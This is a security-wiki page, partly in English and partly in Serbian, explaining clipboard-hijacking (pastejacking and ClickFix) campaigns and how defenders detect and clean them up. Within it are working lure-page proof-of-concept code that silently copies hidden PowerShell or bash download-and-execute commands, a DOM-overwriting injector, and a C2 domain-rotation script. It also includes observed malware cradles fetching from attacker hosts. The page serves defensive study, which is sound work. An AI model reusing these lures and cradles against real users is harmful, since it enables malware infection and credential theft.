# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Overview

Clipboard hijacking – also known as *pastejacking* – abuses the fact that users routinely copy-and-paste commands without inspecting them. A malicious web page (or any JavaScript-capable context such as an Electron or Desktop application) programmatically places attacker-controlled text into the system clipboard. Victims are encouraged, normally by carefully crafted social-engineering instructions, to press **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), or open a terminal and *paste* the clipboard content, immediately executing arbitrary commands.

Because **no file is downloaded and no attachment is opened**, the technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution. The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.

## Wallet-address replacement clippers

Another **clipboard hijacking** variant does not paste commands at all: it waits until the victim copies a **cryptocurrency wallet address**, then silently swaps it for an attacker-controlled one just before paste. This is especially effective against long wallet formats because users often only verify the first/last characters.

Common real-world traits:
- **Thin loader + nested payload**: the visible app/exe looks like a legitimate trading or "profit" tool, while the real clipper is hidden deeper in the bundle (for example a .NET loader launching a nested Rust payload).
- **Regex-driven replacement**: the malware matches strings such as `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, or even generic **44-character Solana-like** strings and rewrites them to attacker wallets.
- **Wallet rotation at scale**: modern Windows samples may embed **thousands** of replacement wallets per currency instead of a single static address, reducing wallet reputation burn after each theft.

### Windows clipper flow

A common implementation is a hidden window registered with **`AddClipboardFormatListener`**. On each clipboard update, the malware typically calls:
- **`OpenClipboard`** → access current clipboard data.
- **`GetClipboardData`** → read text.
- **`EmptyClipboard`** + **`SetClipboardData`** → replace the wallet string with the attacker value.

Minimal hunting regexes frequently seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-level persistence je dovoljna za impact. Jedan uočeni obrazac je:
- Kopirati payload u **`%APPDATA%\silke\silke.exe`**
- Napraviti **Startup-folder LNK** u okviru `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ideje za detekciju:
- Procesi koji neprekidno pozivaju clipboard APIs dok istovremeno upisuju u `%APPDATA%` i user **Startup** folder.
- Novo LNK/executable kreiranje praćeno prepisivanjem wallet-address u clipboard-u.
- Arhive ili fake-software bundle-ovi koji sadrže mnogo neiskorišćenih fajlova plus mali launcher koji pokreće nested binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

Na macOS, neke kampanje isporučuju **`unlocker.command`** helper i instruiraju žrtvu da uradi right-click → **Open** ako Gatekeeper kaže da je app oštećen ili od neidentifikovanog developer-a. Skripta jednostavno uklanja quarantine i pokreće obližnji `.app`:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Ovo **nije** Gatekeeper exploit; ovo je **socijalno inženjersko zaobilaženje quarantine** koje zloupotrebljava činjenicu da Gatekeeper odluke zavise od `com.apple.quarantine` xattr.

Nakon izvršavanja, clipper može da opstane kao trenutni korisnik tako što upisuje:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent sa `RunAtLoad` i `KeepAlive`

Koristan odbrambeni detalj je da neki uzorci implementiraju **self-healing watchdog** koji ponovo upisuje LaunchAgent i wrapper na svakih ~30 sekundi. Ako prvo uklonite plist **bez ubijanja procesa koji radi**, malware ga može odmah ponovo napraviti. Redosled bezbednog čišćenja:
1. Ubijte aktivni clipper process.
2. Unload/delete LaunchAgent plist.
3. Obrišite `~/launch.sh` i kopirani payload.

### Napomena o isporuci: lažni reputation kao multiplikator sile

Za ovu familiju, sam malware može ostati tehnički jednostavan dok **distribucioni sloj** odrađuje težak posao: lažni GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views i benigno izgledajući VirusTotal comments/votes koriste se da binarna datoteka deluje pouzdano pre izvršavanja.

## Forsirani copy buttoni i skriveni payloads (macOS one-liners)

Neki macOS infostealers kloniraju instalacione sajtove (npr. Homebrew) i **forsiraju upotrebu “Copy” dugmeta** tako da korisnici ne mogu da označe samo vidljiv tekst. Clipboard unos sadrži očekivanu installer komandu plus dodatni Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), tako da jedno paste izvršava oba, dok UI skriva dodatni stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje su koristile `document.execCommand('copy')`, dok novije zavise od asinhronog **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. Korisnik poseti typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Umetnuti **ClearFake** JavaScript poziva `unsecuredCopyToClipboard()` helper koji neprimetno skladišti Base64-kodovani PowerShell one-liner u clipboard.
3. HTML instrukcije govore žrtvi da: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` se izvršava, preuzimajući arhivu koja sadrži legitimni executable plus malicious DLL (klasičan DLL sideloading).
5. Loader dekriptuje dodatne stage-ove, ubacuje shellcode i instalira persistence (npr. scheduled task) – na kraju pokreće NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) pretražuje svoj direktorijum za `msvcp140.dll`.
* Zlonamerna DLL dinamički rešava API-je pomoću **GetProcAddress**, preuzima dva binara (`data_3.bin`, `data_4.bin`) preko **curl.exe**, dešifruje ih koristeći rolling XOR ključ `"https://google.com/"`, injektuje finalni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → ostavlja `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** poziv pokreće skriveni PowerShell skript koji preuzima `PartyContinued.exe`, izdvaja `Boat.pst` (CAB), rekonstruiše `AutoIt3.exe` kroz `extrac32` i spajanje fajlova i na kraju pokreće `.a3x` skript koji eksfiltrira browser credentials na `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Neke ClickFix kampanje potpuno preskaču preuzimanje fajlova i instruiraju žrtve da nalepi jednu liniju koja preko WSH preuzima i izvršava JavaScript, uspostavlja persistence i rotira C2 svakog dana. Primer opaženog lanca:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne osobine
- Obfuskovan URL se obrće tokom izvršavanja da bi se izbegla površna inspekcija.
- JavaScript se održava kroz Startup LNK (WScript/CScript), i bira C2 prema trenutnom danu – omogućavajući brzo rotiranje domena.

Minimalni JS fragment korišćen za rotaciju C2 po datumu:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sledeća faza obično postavlja loader koji uspostavlja persistence i preuzima RAT (npr. PureHVNC), često pinning TLS na hardkodovani sertifikat i chunking saobraćaja.

Ideje za detekciju specifične za ovu varijantu
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Startup artefakti: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS putanjom ispod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i command-line telemetry koji sadrže `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponovljeni `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ovima za slanje dugih skripti bez dugih command line-ova.
- Scheduled Tasks koji naknadno izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` pod task/path nalik updater-u (npr. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- C2 hostnames i URL-ovi koji se rotiraju dnevno i imaju obrazac `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Koreliraj clipboard write događaje praćene Win+R paste, pa odmah zatim `powershell.exe` execution.


Blue-teams mogu da kombinuju clipboard, process-creation i registry telemetriju da bi precizno identifikovali pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju komandi za **Win + R** – tražite neuobičajene Base64 / obfuscated zapise.
* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe` i `NewProcessName` u { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranje fajlova ispod `%LocalAppData%\Microsoft\Windows\WinX\` ili privremenih foldera neposredno pre sumnjivog 4688 događaja.
* EDR clipboard senzori (ako postoje) – koreliraj `Clipboard Write` odmah praćen novim PowerShell procesom.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Nedavne kampanje masovno prave lažne CDN/browser verification stranice ("Just a moment…", IUAM-style) koje navode korisnike da kopiraju OS-specifične komande iz clipboarda u native console. Ovo prebacuje execution iz browser sandbox-a i radi i na Windows i na macOS.

Ključne osobine stranica generisanih builder-om
- OS detekcija preko `navigator.userAgent` da bi se payload prilagodio (Windows PowerShell/CMD naspram macOS Terminal). Opcioni decoys/no-ops za nepodržane OS radi održavanja iluzije.
- Automatsko clipboard-copy na bezopasne UI akcije (checkbox/Copy) dok vidljivi tekst može da se razlikuje od clipboard sadržaja.
- Blokiranje mobilnih uređaja i popover sa uputstvima korak po korak: Windows → Win+R→paste→Enter; macOS → otvori Terminal→paste→Enter.
- Opciona obfuscation i single-file injector za prepisivanje DOM-a kompromitovanog sajta Tailwind-styled verification UI-jem (nije potrebna nova registracija domena).

Primer: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence prvog pokretanja
- Koristi `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` tako da se izvršavanje nastavi nakon zatvaranja terminala, smanjujući vidljive tragove.

Preuzimanje stranice na kompromitovanim sajtovima u mestu
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideje za detekciju i hunting specifične za IUAM-style mamce
- Web: Stranice koje vezuju Clipboard API za verification widgete; neslaganje između prikazanog teksta i clipboard payload-a; `navigator.userAgent` grananje; Tailwind + single-page replace u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` ubrzo nakon browser interakcije; batch/MSI instaleri izvršeni iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm pokreće `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; background jobs koji preživljavaju zatvaranje terminala.
- Korreluj `RunMRU` Win+R istoriju i clipboard writes sa naknadnim console process creation.

Pogledajte i za prateće tehnike

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolucije (ClearFake, Scarlet Goldfinch)

- ClearFake nastavlja da kompromituje WordPress sajtove i injektuje loader JavaScript koji lančano koristi eksterni hostove (Cloudflare Workers, GitHub/jsDelivr) i čak blockchain “etherhiding” pozive (npr. POST-ove ka Binance Smart Chain API endpointima kao što je `bsc-testnet.drpc[.]org`) da bi povukao trenutnu lures logiku. Nedavni overlay-ji intenzivno koriste fake CAPTCHAs koji instruiraju korisnike da copy/paste-uju jedan linijski unos (T1204.004) umesto da bilo šta preuzimaju.
- Početno izvršavanje se sve češće delegira potpisanim script hostovima/LOLBAS. Lanaci iz januara 2026. zamenili su raniju `mshta` upotrebu ugrađenim `SyncAppvPublishingServer.vbs` izvršenim preko `WScript.exe`, prosleđujući PowerShell-like argumente sa aliasima/wildcard-ovima za fetchovanje remote sadržaja:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` je potpisan i normalno ga koristi App-V; uparен sa `WScript.exe` i neuobičajenim argumentima (`gal`/`gcm` aliasi, wildcarded cmdlets, jsDelivr URLs) postaje high-signal LOLBAS stage za ClearFake.
- Februar 2026 fake CAPTCHA payloads su se vratili na pure PowerShell download cradles. Dva live primera:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Prvi chain je `iex(irm ...)` grabber u memoriji; drugi stage-uje preko `WinHttp.WinHttpRequest.5.1`, upisuje privremeni `.ps1`, pa pokreće sa `-ep bypass` u skrivenom prozoru.

Detection/hunting tips for these variants
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles odmah nakon clipboard writes/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, ili raw IP `iex(irm ...)` patterns.
- Network: outbound to CDN worker hosts ili blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
- File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix approach nakon što namami korisnike u malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
